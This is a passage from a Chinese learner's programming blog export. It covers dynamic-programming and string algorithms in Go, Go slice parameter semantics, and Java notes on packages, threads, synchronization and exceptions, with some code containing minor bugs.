也就是，当4算进来的时候，我们需要判断讲它与前面相连能否得到最多的集合 那么，我们假设当前计算的末尾为i时，设其有t张，i-2有x张，i-1有y张，dp[m][n]表示当留下剩余i-1的m张,i的n张时的集合数，shunzi为当前需要的顺子数（0 &lt;= shunzi &lt;= min{m,min{n,cnt}}） 那么当前的集合数为：$$new_score= shunzi + dp[m_{i-2}][n_{i-1}] + (t-shunzi-n_i)/3\\$$ $$dp[m_{i-1}][n_i]=max{dp[m_{i-1}][n_i],new_score}$$ 算法实现： func maxGroupNumber(tiles []int) int { count := make(map[int]int) // 记录每张牌的数量 for _, tile := range tiles { count[tile]++ } var ks []int for i, _ := range count { ks = append(ks, i) } sort.Slice(ks, func(i, j int) bool { return ks[i] &lt; ks[j] }) var dp [5][5]int // 表示预留x张t-2，y张t-1的时候 当前能组成的牌组 for i, ints := range dp { for i2, _ := range ints { dp[i][i2] = -1 } } dp[0][0] = 0 pre_tile := 0 // 当前牌的前一张的点数 for _, i := range ks { cnt := count[i] // 如果不连续 if pre_tile != i-1 { dp00 := dp[0][0] // i-2 和 i-1 留下的牌数都为0，即使当前若不留牌的集合数 // 重新来过 for i1, ints := range dp { for i2, _ := range ints { dp[i1][i2] = -1 } } dp[0][0] = dp00 } var new_dp [5][5]int for i1, ints := range new_dp { for i2, _ := range ints { new_dp[i1][i2] = -1 } } for cnt_2 := 0; cnt_2 &lt; 5; cnt_2++ { // cnt-2 的牌数 for cnt_1 := 0; cnt_1 &lt; 5; cnt_1++ { // 对应没那么多 if dp[cnt_2][cnt_1] &lt; 0 { continue } // 如果有满足，即使当 dp00时候 // 假设当顺子为shunzi。你们下一个new_2 = cnt_1 - shunzi; new_1 = cnt - shunzi for shunzi := 0; shunzi &lt;= min(cnt_1, min(cnt_2, cnt)); shunzi++ { new_2 := cnt_1 - shunzi // 下一个的t-2，就是这个的t-1 // 新的t-1的范围为4和当前 cnt 减去被连续用剩下的 for new_1 := 0; new_1 &lt;= min(4, cnt-shunzi); new_1++ { new_score := dp[cnt_2][cnt_1] + shunzi + (cnt-shunzi-new_1)/3 new_dp[new_2][new_1] = max(new_dp[new_2][new_1], new_score) } } } } dp = new_dp pre_tile = i } ans := 0 for cnt_2 := 0; cnt_2 &lt; 5; cnt_2++ { for cnt_1 := 0; cnt_1 &lt; 5; cnt_1++ { ans = max(ans, dp[cnt_2][cnt_1]) } } return ans } func min(x, y int) int { if x &lt; y { return x } return y } func max(x, y int) int { if x &gt; y { return x } return y }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"动归","slug":"动归","permalink":"https://github.com/z-anshun/tags/%E5%8A%A8%E5%BD%92/"}]},{"title":"最低加油次数","slug":"最低加油次数","date":"2021-10-09T10:12:46.000Z","updated":"2021-10-09T10:13:13.471Z","comments":true,"path":"2021/10/09/zui-di-jia-you-ci-shu/","link":"","permalink":"https://github.com/z-anshun/2021/10/09/zui-di-jia-you-ci-shu/","excerpt":"","text":"题目：汽车从起点出发驶向目的地，该目的地位于出发位置东面 target 英里处。 沿途有加油站，每个 station[i] 代表一个加油站，它位于出发位置东面 station[i][0] 英里处，并且有 station[i][1] 升汽油。 假设汽车油箱的容量是无限的，其中最初有 startFuel 升燃料。它每行驶 1 英里就会用掉 1 升汽油。 当汽车到达加油站时，它可能停下来加油，将所有汽油从加油站转移到汽车中。 为了到达目的地，汽车所必要的最低加油次数是多少？如果无法到达目的地，则返回 -1 。 注意：如果汽车到达加油站时剩余燃料为 0，它仍然可以在那里加油。如果汽车到达目的地时剩余燃料为 0，仍然认为它已经到达目的地。 示例 1： 输入：target = 1, startFuel = 1, stations = []输出：0解释：我们可以在不加油的情况下到达目的地。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/minimum-number-of-refueling-stops 解法1：DP 解析：假设我们当前加油了i次，当前最远距离为s，如： target = 100, startFuel = 10, stations = [[10,60],[20,30],[30,30],[60,40]] 那么，我们只加油1次，那么最远就可以跑 10 + 60 = 70 如果两次 ，那么就是 10 + 60 + 40 =110 那么，令dp[i]为加油i次可以到达的最远距离，s为新加入加油站的油$$dp[i]=max{dp[i],dp[i]+s}$$代码实现： func minRefuelStops(target int, startFuel int, stations [][]int) int { dp := make([]int, len(stations)+1) dp[0] = startFuel // 遍历到达每个节点 for i, station := range stations { // 当前最多能加i次 // dp[i+1]=max(dp[i+1],dp[i]+s) // 这里只能是从后往前， // 因为当前加入i这个站点后，如果从前面往后，就会导致这个点多次用，改变dp[i] for k := i; k &gt;= 0; k-- { // 当前加这么多次能到达，就表示可以选择这个加油站 if dp[k] &gt;= station[0] { dp[k+1] = max(dp[k+1], dp[k]+station[1]) } } } for i, v := range dp { if v &gt;= target { return i } } return -1 } func max(x, y int) int { if x &gt; y { return x } return y } 解法2：最大堆+贪心 解析：假设我们期望到达下一个站点，那么有可能当前的油能够到达或者不能到达，如果不能到达，那么我们就需要在前面路过时的站点能加最多油的进行加油，直到能够到达，如果每个站点都加过了还是无法到达，就返回-1 代码实现： func minRefuelStops(target int, startFuel int, stations [][]int) int { var qp []int res := 0 nowTank := startFuel for _, station := range stations { if nowTank &lt; station[0] { // 选多个路过的站加 if len(qp) == 0 { return -1 } c:=0 for r:=0;r&lt;len(qp);r++{ nowTank += qp[r] res++ c++ if nowTank&gt;=station[0]{ break } } qp=qp[c:] } if nowTank &gt;= station[0] { qp = append(qp, station[1]) sort.Slice(qp, func(i, j int) bool { return qp[i] &gt; qp[j] }) } else { return -1 } } if nowTank &gt;= target { return res } for i := 0; i &lt; len(qp); i++ { nowTank += qp[i] res++ if target &lt;= nowTank { return res } } return -1 }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"动归","slug":"动归","permalink":"https://github.com/z-anshun/tags/%E5%8A%A8%E5%BD%92/"}]},{"title":"劲爆金曲","slug":"劲爆金曲","date":"2021-10-01T10:21:43.000Z","updated":"2021-10-09T10:13:19.232Z","comments":true,"path":"2021/10/01/jing-bao-jin-qu/","link":"","permalink":"https://github.com/z-anshun/2021/10/01/jing-bao-jin-qu/","excerpt":"","text":"剩下n首歌，t秒时间，问最多能唱几首的前提下，最长时间 输出最多歌数和最长时间 思路： 典型的动归问题，假设我们现在要唱j秒，然后当我们新加入一首歌时，我们会判断能否加入。 如果加入那么最多能唱的歌数为j减去这首歌的时间内能最多唱的数量+1 如果不加入，那么就是未加入这首歌时，j秒内最多能唱的数量 因此，我们推出公式$$dp[i][j]=max{dp[i-1][j],dp[i-1][j-songs[i]]+1}$$上面i为第i首歌，j为时间，songs为每首歌对应的时长 代码实现： // KTV n首歌, 剩余t时间，songs为每首歌的时长 // 金曲的时长为687s func KTV(n, t int, songs []int) (int, int) { number := make([][]int, len(songs)+1) for k, _ := range number { number[k] = make([]int, t) } number[0][0] = 0 // 0首0s for i := 1; i &lt;= len(songs); i++ { for j := 0; j &lt; t; j++ { number[i][j] = number[i-1][j] if j &gt;= songs[i] { // 当前的j满足唱这首歌,确保指针不为负 number[i][j] = max(number[i][j], number[i-1][j-songs[i]]+1) } } } } 上面的代码实现了number的初始化，那么最长歌数一定是在number[n]数组里面，那么最长时间呢？ 因为number[i][j]表示的为j秒内最多可唱的歌，也就是当j1&gt;j2时，那么number[i][j1]&gt;=number[i][j2]，因此我们无法知道这个j是否为唱这么多首歌所需的时间 解决思路： 我们期望的时间肯定为t-1，那么，我们遍历每一首歌，如果当前这一首能唱，并且满足number中在唱这首歌后刚好为当前歌数-1，那么就代表能选择这首 代码实现： func total_time(t, n int, songs []int, number [][]int) int { // 当前剩下的时间t,总的时间 for i := 0; i &lt; n; i++ { if t &gt;= songs[i] &amp;&amp; number[i][t] == number[i][t-songs[i]]+1 { return songs[i] + total_time(t-songs[i], n, songs, number) } } return 0 } 总代码实现： // KTV n首歌, 剩余t时间，songs为每首歌的时长 // 金曲的时长为687s func KTV(n, t int, songs []int) (int, int) { number := make([][]int, len(songs)+1) for k, _ := range number { number[k] = make([]int, t) } number[0][0] = 0 // 0首0s for i := 1; i &lt;= len(songs); i++ { for j := 0; j &lt; t; j++ { number[i][j] = number[i-1][j] if j &gt;= songs[i] { // 当前的j满足唱这首歌,确保指针不为负 number[i][j] = max(number[i][j], number[i-1][j-songs[i]]+1) } } } ans := total_time(t-1, n, songs, number) return number[n][ans] + 1, ans + 678 // 最长时间，最多歌曲 } func total_time(t, n int, songs []int, number [][]int) int { // 当前剩下的时间t,总的时间 for i := 0; i &lt; n; i++ { if t &gt;= songs[i] &amp;&amp; number[i][t] == number[i][t-songs[i]]+1 { return songs[i] + total_time(t-songs[i], n, songs, number) } } return 0 } func max(x, y int) int { if x &gt; y { return x } return y }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"动归","slug":"动归","permalink":"https://github.com/z-anshun/tags/%E5%8A%A8%E5%BD%92/"}]},{"title":"并查集","slug":"并查集","date":"2021-09-30T15:08:29.000Z","updated":"2021-09-30T15:09:04.936Z","comments":true,"path":"2021/09/30/bing-cha-ji/","link":"","permalink":"https://github.com/z-anshun/2021/09/30/bing-cha-ji/","excerpt":"","text":"对于一组数据，当要求我们检查某两个数据是否在同一集合内时，就需要并查集去实现了 如：&lt;a,b&gt;,&lt;b,c&gt;，那么很明显a、b、c都在同一集合内 实现思路： 如果我们先将输入的a、b指向自己，再将a指向b，即a令父亲为b 那么： 当我们再输入b，c后，跟上面一样的操作： 很明显，我们就可以通过a，b，c是否拥有统一父亲确定是否为同集合了 理解这个思路很简单，那么代码如何实现？ 首先，设置两个map进行数据的存储 var fa map[int]int // 父节点 var cnt map[int]int // 子节点数量 我们需要一个函数来进行查找，某个点的父亲 func find(x int) int { i, ok := fa[x] if !ok { // 如果没有 fa[x] = x cnt[x] = 0 return x } // 当前节点为父节点 if i == x { return x } else { // 不是父节点，继续寻找 fa[x] = find(fa[x]) return fa[x] } } 有了寻找父节点的函数后，其联合，便简单了，只需要将一个节点的父亲设置为另一个节点父亲的父亲节点 // 联合 func Union(x, y int) { fx := find(x) fy := find(y) fa[fx] = fy // x的父亲的父亲就是y的父亲, } 例题： 现在有107个用户，编号为1- 107，现在已知有m对关系，每一对关系给你两个数x和y，代表编号为x的用户和编号为y的用户是在一个圈子中，例如：A和B在一个圈子中，B和C在一个圈子中，那么A,B,C就在一个圈子中。现在想知道最多的一个圈子内有多少个用户。 链接：https://www.nowcoder.com/questionTerminal/11ee0516a988421abf40b315a2b28d08来源：牛客网 代码实现 package dom07 import \"fmt\" var fa map[int]int // 父节点 var cnt map[int]int // 子节点数量 func find(x int) int { i, ok := fa[x] if !ok { // 如果没有 fa[x] = x cnt[x] = 0 return x } // 当前节点为父节点 if i == x { return x } else { // 不是父节点，继续寻找 fa[x] = find(fa[x]) return fa[x] } } // 联合 func Union(x, y int) { fx := find(x) fy := find(y) fa[fx] = fy // x的父亲的父亲就是y的父亲, } func main() { for { t := 0 _, err := fmt.Scanf(\"%d\", &amp;t) if err != nil { return } for i := 0; i &lt; t; i++ { n := 0 fmt.Scanf(\"%d\", &amp;n) fa = make(map[int]int) cnt = make(map[int]int) max := 0 for j := 0; j &lt; n; j++ { var x, y int fmt.Scanf(\"%d %d\", &amp;x, &amp;y) Union(x,y) } for vk, _:= range fa { fi:=find(vk) cnt[fi]++ if cnt[fi]&gt;max{ max=cnt[fi] } } fmt.Println(max) } } }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"Manacher","slug":"Manacher","date":"2021-09-27T14:56:33.000Z","updated":"2021-10-03T16:34:36.889Z","comments":true,"path":"2021/09/27/manacher/","link":"","permalink":"https://github.com/z-anshun/2021/09/27/manacher/","excerpt":"","text":"题目：给定一段字符串，求该其最长的回文子串 主要思路： 我们创建一个将目标字符穿进行扩充，然后使用#进行填充，并在前后分别添加^和$方便后续操作 再创建一个数组T记录当前节点的半径 如何构造？假设当前该设置下标为i的值了，i的左边有一个下标c的，其半径能到达的最右边为当前最大 那么，如果i关于c对称的点在c的半径里面，那么i的半径一定大于等于其对称点的半径，即可以设置为对称点的半径，如果不在，就先假设当前i的半径为0 然后我们再对i加上当前已知i半径的左右比较，如果相等则将T[i]+1，反之就已经找到当前半径最大 构造完之后如下，这里的目标字符串为aba， 比如：我在构造i=4的时候，也就是如下的b点时，当前的中心为a，其a的半径为1，即右边最大可达3，是小于当前b的下标的，所以T[4]=0，然后再向b的左右遍历，直到T[4]=3的时候，不再对称，退出 代码实现： // 获得s的最长回文子串长度 func Manacher(s string) int { str := \"^#\" for _, v := range s { str += string(v) str += \"#\" } str += \"$\" T := make([]int, len(str)) // 保存当前节点的半径长 center := 0 maxRadius := 0 maxLen := 0 for i := 1; i &lt; len(str)-1; i++ { // 在当前最长的范围内 if i &lt; center+maxRadius { // 寻找对称的左边点，但也有可能右边没那么长，所以取最小 T[i] = min(T[center*2-i], center+maxRadius-i) } // 对应右边一个和左边一个比较，因为最后一个一定不匹配，所以这不用担心指针溢出 for str[i+T[i]+1] == str[i-T[i]-1] { T[i]+=1 } // 如果当前的右边的临界比原来的大， if i+T[i] &gt; center+maxRadius { nowLen := maxRadius if nowLen &gt; maxLen { maxLen = nowLen } center = i maxRadius = T[i] } } return maxLen } func min(x, y int) int { if x &lt; y { return x } return y } 时间复杂度：$$O(n^2)$$","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"关于Golang的指针传递","slug":"golangCall","date":"2021-09-20T03:27:53.000Z","updated":"2021-09-27T15:26:20.706Z","comments":true,"path":"2021/09/20/golangcall/","link":"","permalink":"https://github.com/z-anshun/2021/09/20/golangcall/","excerpt":"","text":"首先，我们先来看一段代码 package main import \"fmt\" func main(){ var i []int try(i) fmt.Println(i) //[] } func try(i []int){ i = append(i, 1) } 在这里，理论上来说本应该打印[1]，因为切片为一个指针，在try函数对其进行了append，其本来指向的地址也应该改变。但是，这里却为空 Golang的值传递首先，Go这门语言对参数的传递都是值传递的，也就是说，在传递切片i的时候，函数只是复制了它本身的引用（其本身是个指针），如： package main import \"fmt\" func main(){ var i []int=[]int{0} try(i) fmt.Printf(\"%p\\n\",&amp;i[0]) // 0xc00000a0b0 fmt.Printf(\"%p\\n\",&amp;i) // 0xc0000044a0 } func try(i []int){ fmt.Printf(\"%p\\n\",&amp;i[0]) // 0xc00000a0b0 fmt.Printf(\"%p\\n\",&amp;i) // 0xc0000044c0 } 这里你就可能明白了，对切片的传递，其实是传递的引用，也就相当于新建一个指针，进而指向该切片。 但是，既然都指向了该切片了，理论上append该切片的话，也应该能打印出来，而一开头代码却无法打印，我们接着往下看 切片的特性老规矩，先看一段代码 package main import \"fmt\" func main() { i:=[]int{1} try(i) } func try(i []int) { fmt.Printf(\"%p\\n\", &amp;i[0]) // 0xc00000a0b0 i = append(i, 1) fmt.Printf(\"%p\\n\", &amp;i[0]) // 0xc00000a0e0 } 很明显。如果了解切片特性的人就知道，在GO的切片容量不足时，对其进行append，会新开辟一片空间，进而复制原来的新加入的，再由append返回地址。 这也就是为什么一开头的代码无法打印出新加入值的原因。 那么，我们给初始化的切片足够容量，是不是就可以打印了？ func main() { i:=make([]int,1,2) try(i) fmt.Println(i) // [0] fmt.Printf(\"%p\\n\",&amp;i[0]) // 0xc00000a0b0 } func try(i []int) { i = append(i, 1) fmt.Println(i) // [0,1] fmt.Printf(\"%p\\n\",&amp;i[0]) // 0xc00000a0b0 } 很明显，虽然两个切片头的地址都一样，但还是打印不了， 对于这一点，我们得知道切片在GO代码中的是如何定义的 type slice struct { array unsafe.Pointer len int cap int } 我们前面说了GO是指传递的，也就是说，虽然函数中的切片指向的是源切片，但是它的len和cap却是一个值，换句话说，我虽然append了原切片，但是在主函数中的len和cap却没有改变，改变的只是原函数中的。 因此，我们要想获取函数中添加的1，也不是不可以 func main() { i:=make([]int,1,2) try(i) ptr:=uintptr(unsafe.Pointer(&amp;i[0])) fmt.Println(*(*int)(unsafe.Pointer(ptr + 8))) // 1 } func try(i []int) { i = append(i, 1) } 这里，我们将切片的第一个元素的指针往后移8字节，就找到新添加的了。 总结Go对于切片的操作虽然是传递的引用，但由于切片的特性，若在传递的函数中对其添加操作，其原函数中的切片是无法察觉的。因此我们尽量避免对切片参数进行添加这种情况。","categories":[{"name":"学习","slug":"学习","permalink":"https://github.com/z-anshun/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://github.com/z-anshun/tags/Golang/"}]},{"title":"JAVA学习第六天","slug":"day06","date":"2021-03-02T13:16:00.000Z","updated":"2021-03-02T13:17:10.741Z","comments":true,"path":"2021/03/02/day06/","link":"","permalink":"https://github.com/z-anshun/2021/03/02/day06/","excerpt":"","text":"包及访问控制权限打包语法 1package 包名 编译语法 javac -d . PackageDemo01.java -d:表示生成目录，目录以package的定义为准 .：表示在当前所在的文件夹下生成 导入 import语法 12import 包.*; // 直接导入import static 包.类.* // 静态导入 访问权限 private：私有访问权限，只能在本类中进行访问 default：默认访问权限，可在本包中进行访问 protected：保护访问权限，只能被本包和不同包的子类访问 public：公开访问权限，所以类中，均可访问 protected举例，即子类的均可访问 12345package test.fun;public class fun { protected String Fun = \"123\";} 123456789101112131415package test.fun2;import test.fun.fun;class Fun extends fun{ public String Say(){ return Fun; }}public class fun2 { public static void main(String args[]){ System.out.println(new Fun().Say()); }} 命名规范再次重提，回顾前面 类：单词首字母大写 方法：第一个单词小写，之后的每个单词都大写，如getInfo() 属性：跟方法一样，如：studentName 包：所有单词均小写 常量：所以单词字面均大写 进程与线程进程一个程序执行的动态过程，其包含一个或多个线程，数据不共享，至少包含初始态、执行态、等待状态、就绪状态和终止状态5个 线程cpu调用和分配的最小单位，其数据可共享 Java实现线程语法 12345678class 类名 extends Thread{ 属性...; 方法...; // 实现抽象方法 public void run(){ 线程主体; }} 例子 1234567891011121314151617public class fun2 { public static void main(String args[]){ System.out.println(new Fun().Say()); ThreadOne t1=new ThreadOne(); t1.start(); // 虽然这里是start，代表启动线程，但实际调用的还是run ThreadOne t2=new ThreadOne(); t2.start(); }}class ThreadOne extends Thread{ public void run(){ for (int i=0;i&lt;10;i++){ System.out.println(i); } }} 为什么只调用start方法启动协程，而不使用run？ 我们先来看一下源码 12345678910public synchronized void start() { ... if (threadStatus != 0) throw new IllegalThreadStateException(); ... start0(); .... private native void start0(); ...} 首先，一个线程对象肯定只能启动一次线程，这里的native表示调用的本机操作系统的函数，即用操作系统来对线程进行管理 Runnable通过实现Runnable接口实现多线程 格式 12345678class ThreadTwo implements Runnable{ 属性...; 方法...; @Override public void run() { 线程主体; }} 举例，因为Runnable接口并没有实现start()方法，所以我们不能直接调用其对象，只能通过public Thread(Runnable target)和public Thread(Runnable target,String name)的两个构造函数实现 123456789101112131415161718192021public class fun2 { public static void main(String args[]){ ThreadTwo r1=new ThreadTwo(); ThreadTwo r2=new ThreadTwo(); Thread t1=new Thread(r1); Thread t2=new Thread(r2); t1.start(); t2.start(); }}class ThreadTwo implements Runnable{ @Override public void run() { for (int i=0;i&lt;10;i++){ System.out.println(i); } }} Runnable接口和Thread类的区别首先，我们先来看一段代码 1234567891011121314151617public class fun2 { public static void main(String args[]){ ThreadOne t1=new ThreadOne(); t1.start(); ThreadOne t2=new ThreadOne(); t2.start(); }}class ThreadOne extends Thread{ public int ticket =5; public void run(){ for (int i=0;i&lt;5;i++){ System.out.println(ticket--); } }} 输出 123456789105432154321 很明显，这里虽然启动了两个线程，但却没有达到资源共享的目的， 解释，继承实际上是是重写了 run() 方法，由于线程的资源和 Thread 实例捆绑在一起，所以不同的线程的资源不会进行共享。 123456789101112131415161718192021222324public class fun2 { public static void main(String args[]){ ThreadTwo r1=new ThreadTwo(); Thread t1=new Thread(r1); Thread t2=new Thread(r1); t1.start(); t2.start(); }}class ThreadTwo implements Runnable{ public int ticket=5; @Override public void run() { for (int i=0;i&lt;10;i++){ if(ticket&gt;0){ System.out.println(ticket--); } } }} 其实这里也不难理解，因为本质上调用的都是同一个继承的对象。这种实现方式就是静态代理的方式，线程资源与 Runable 实例捆绑在一起，Thread 只是作为一个代理类，所以资源可以进行共享 因此，我们一般使用实现Runnable的接口来实现线程的调用 这样做的优势有： 实现 Runnable 大多数情况下是比继承 Thread 更好的方法。 Java 只支持单继承，所以你继承了 Thread 的话，其他的类你就不能继承了。 如果实现 Runnable 接口，多线程可以直接将你的工作并发处理（直接使用 start）。而继承 Thread 不能直接进行多线程工作，你得为你的每一部分工作都定义一个线程。 其他的一些API，接口都是 Runnable 类型的。比如 Java 内置的线程池 API ExcutorService 等。 其实 Thread 只是实现 Runnable 接口，并增加了一些常用方法而已 解释，为什么说单继承的局限性？ 因为继承Thread，我们相当于只是继承了Thread，没有实现Runnable的多线程功能，也就是现在是确保每部分工作都在一个独立的线程，即你对一个对象调用两次start是错误的 线程状态线程分为，创建、就绪、运行、堵塞和死亡5个状态 创建：即new Thread 就绪：当我们调用start()方法时，该线程就会进行就绪状态，遵循CPU的调度 运行：当就绪状态的线程被调度并获取到处理器资源时，此时便会调用该线程对象的run()方法 阻塞：调用sleep()、wait()、suspend()等方法时，线程便会被阻塞，即无法进入排队队列 死亡：即调用结束或者调用stop()方法终止了进程 Thread类的主要方法 方法名 类型 描述 public Thread(Runnable target) 构造 接收Runnable接口的子类对象，实例化Thread对象 public Thread(Runnable target,String name) 构造 与上一个相同，只是会增加一个线程名 public Thread(String name) 构造 返回Thread对象，并设置线程名 public static Thread currentThread() 普通 返回正在执行的线程 public final int getPriorit() 普通 返回线程的优先级 public final String getName() 普通 返回线程名 public boolean isInterrupted() 普通 判断线程是否中断 public final boolean isAlive() 普通 判断线程是否在活动 public final void join() throws InterruptdException 普通 等待线程死亡，即强制运行，其它线程均等待 public final synchronized void join(long millis) throws InterruptdException 普通 等待millis毫秒后，线程死亡 public void run() 普通 执行线程 public final void setName(String name) 普通 设定线程名 public final void setPriority(int newPriority) 普通 设定线程的优先级 public static void sleep(long millis) throws InterruptdException 普通 使当前执行的线程休眠millis毫秒 public void start() 普通 开始执行线程 public String toString() 普通 返回代表线程的字符串 public static void yield() 普通 停止当前正在执行的线程，允许其它线程运行 public final void setDaemon(boolean on) 普通 将一个线程设置为后台运行 线程默认名字为 Thread-XX(如：Thread-1) sleepinterrupt方法可终止所有线程，即使该线程处于堵塞状态 1234567891011121314151617181920212223242526272829class MyThread implements Runnable { @Override public void run() { System.out.println(\"1.进入了run方法\"); try { Thread.sleep(10000); System.out.println(\"2.休眠完成\"); } catch (Exception e) { System.out.println(\"3.休眠终止:\" + e.toString()); return; } System.out.println(\"4.正常结束\"); }}public class fun2 { public static void main(String args[]) { MyThread mt = new MyThread(); Thread t = new Thread(mt, \"线程\"); t.start(); try { Thread.sleep(2000); } catch (Exception e) { System.out.println(e); } t.interrupt(); // 中断所有线程 }} 输出 121.进入了run方法3.休眠终止:java.lang.InterruptedException: sleep interrupted setDaemon1234567891011121314151617class MyThreadTwo implements Runnable{ @Override public void run() { while(true){ System.out.println(\"当前正在运行:\"+Thread.currentThread().getName()); } }}public class fun2 { MyThreadTwo my=new MyThreadTwo(); Thread t=new Thread(my,\"线程\"); t.setDaemon(true); t.start(); }} 上述代码并不会陷入死循环，因为该线程设置了后台运行 设置为守护线程： 优先级低 不能操作文件、数据库等资源，避免主线程关闭而未能关闭守护线程的资源 它会在任何时候甚至在一个操作的中间发生中断 主线程关闭后无需手动关闭守护线程，因为会自动关闭 Java垃圾回收线程就是一个典型的守护线程， 也可以理解为所有为线程服务而不涉及资源的线程都能设置为守护线程 setPriority设置优先级，决定哪个线程会被优先执行 123public static final int MIN_PRIORITY = 1;public static final int NORM_PRIORITY = 5;public static final int MAX_PRIORITY = 10; 但这里，并非哪个线程的优先级越高，就会被越先执行，而最终仍是由CPU的调度决定的。（主方法的优先级是5，属于中等级别） yield线程的礼让 12345678910111213141516171819202122class TestYield implements Runnable { @Override public void run() { for (int i = 0; i &lt; 5; i++) { System.out.println(Thread.currentThread().getName() + \"运行--&gt;\" + i); if (i == 3) { System.out.print(\"线程礼让\"); Thread.currentThread().yield(); } } }}public class fun2 { public static void main(String args[]) { TestYield y = new TestYield(); Thread t1 = new Thread(y, \"线程A\"); Thread t2 = new Thread(y, \"线程B\"); t1.start(); t2.start(); }} 实际即停下当前的线程，区执行其它线程 this与Thread.currentThread的区别首先，我们先来一段代码 123456789101112131415161718192021222324252627class MyThread extends Thread { public MyThread() { System.out.println(\"当前线程的名字：\" + Thread.currentThread().getName()); System.out.println(\"当前线程的名字：\" + this.getName()); } @Override public void run() { System.out.println(\"当前线程的名字：\" + Thread.currentThread().getName() + \" run==\" + Thread.currentThread().isAlive()); System.out.println(\"当前线程的名字：\" + this.getName() + \" run==\" + this.isAlive()); }}//启动类public class fun { protected String Fun = \"123\"; public static void main(String[] args) { MyThread myThread = new MyThread(); //初始化Thread对象，方便调用start(); //此时myThread作为参数传入Thread中，其实是myThread委托thread去执行； Thread thread = new Thread(myThread); //初始化自定义线程名称 thread.setName(\"C\"); //启动线程 thread.start(); }} 输出 1234当前线程的名字：main当前线程的名字：Thread-0当前线程的名字：C run==true当前线程的名字：Thread-0 run==false 解释，因为this是这个对象，而我们在构造一个Thread对象时会调用该条代码this(null, target, \"Thread-\" + nextThreadNum(), 0);，即当前线程对象默认的名字为Thread-XX，而Thread.currentThread会表示当前代码段正在被哪个线程调用的相关信息 补充补充：Java中的线程都是同时启动的，具体看谁先抢到了CPU的资源。另外，主方法其实也是一个线程，所以每次运行Java程序会至少启动两个线程（一个main，一个垃圾回收） 注意:虽然golang里也有主协程，但主协程结束，其它协程也会结束。而Java的主线程结束，并不会影响到其它线程 如： 123456789101112131415161718192021222324252627class MyThread implements Runnable { @Override public void run() { for (int i = 0; i &lt; 50; i++) { System.out.println(Thread.currentThread().getName() + \"--&gt;\" + i); } }}public class fun2 { public static void main(String args[]) { MyThread mt=new MyThread(); Thread t=new Thread(mt,\"线程\"); t.start(); for(int i=0;i&lt;50;i++){ if(i&gt;10){ try{ t.join(); }catch (Exception e){ e.printStackTrace(); } } System.out.println(\"Main 线程运行\"+\"--&gt;\"+i); } }} 同步解决数据共享带来的数据冲突 同步代码块规范 123synchronized(同步对象){ 相应的代码} 举例 1234567891011121314151617181920class MyThread implements Runnable{ private int ticket=5; public void run(){ for(int i=0;i&lt;100;i++){ synchronized (this){ if(ticket&gt;0){ System.out.println(\"买票\"+ticket--); } } } }}public class sync { public static void main(String args[]){ MyThread my=new MyThread(); new Thread(my).start(); new Thread(my).start(); }} 同步方法规范 123synchronized 方法的返回值 funName(params){} 例子 123456789101112131415161718192021222324class MyThread2 implements Runnable { private int ticket = 5; @Override public void run() { for (int i = 0; i &lt; 100; i++) { this.sale(); } } public synchronized void sale() { if (ticket &gt; 0) { System.out.println(\"买票\" + ticket--); } }}public class sync { public static void main(String args[]) { MyThread2 my = new MyThread2(); new Thread(my).start(); new Thread(my).start(); }} 死锁当两个或多个对象，都在彼此等待对方执行完成时，这样就会形成死锁，使程序无法再执行下去 总结 打包使用package，import则为导入包 命名规范的问题，就只有类名需要每个单词均大写 Java中的线程实现可以使用Thread继承，也可以使用Runnable接口实现，但由于单继承的局限，所以继承Thread对象的线程是无法实现多线程的 Thread类的主要方法 this代表当前的线程对象，Thread.currentThread表示当前的线程调用的相关信息 对方法定义的完整格式：[public | default | protected | private] [final] [static] [synchronized ] [返回类型 | void] 方法名(参数) throws Exception1,Exception2{ return 返回值} 死锁","categories":[{"name":"学习","slug":"学习","permalink":"https://github.com/z-anshun/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"JAVA","slug":"JAVA","permalink":"https://github.com/z-anshun/tags/JAVA/"}]},{"title":"JAVA学习第五天","slug":"day05","date":"2021-03-02T13:15:56.000Z","updated":"2021-03-02T13:16:58.557Z","comments":true,"path":"2021/03/02/day05/","link":"","permalink":"https://github.com/z-anshun/2021/03/02/day05/","excerpt":"","text":"异常try-catch类似于if-else 语法： 12345678910111213try{ // 可能有错误的语句}catch(异常类 异常对象){ // 对应的处理语句}catch(异常类 异常对象){ }catch(异常类 异常对象){ }...// 下面的finally可省略finally{ // 一定会运行的代码} 如： 12345678910111213141516171819public class main { public static void main(String args[]){// System.out.println(\"hello Java!\"); int y=10; int x=0; try{ int tmp=y/x; System.out.println(tmp); }catch (AbstractMethodError e){ System.out.println(\"Error:\"+e); }catch (Error e){ System.out.println(\"Error:\"+e); } finally { System.out.println(\"test\"); } System.out.println(\"over\"); }} 输出 123Error:java.lang.ArithmeticException: / by zerotestover 这里注意： catch必须对应错 finally一定会执行（如果catch没有捕获到该错误，就会在执行一次finally后退出） try和catch中都有return，而finally只是将值保存起来，换句话说，要return的值，是不会在finally中改变的，因此，应避免在finally中使用return 常见的几个错误： 数组超出绑定异常：ArrayIndexOutBoundsException 数据格式化错误：NumberFormatException 算术异常：ArithmeticException Exception和ErrorException(例外)和Error(错误)均属于Throwable的子类，而 Exception一般表示程序中出现的问题，可以使用try…catch进行处理； Error一般是指JVM错误，无法在程序中进行处理，即不需要程序处理。 Exception属于一个异常类，而上述的算术异常、格式化错误等都属于它的子类，其具有printStackTrace()的方法打印更加详细的异常信息 为什么不用Throwable而用Exception？ 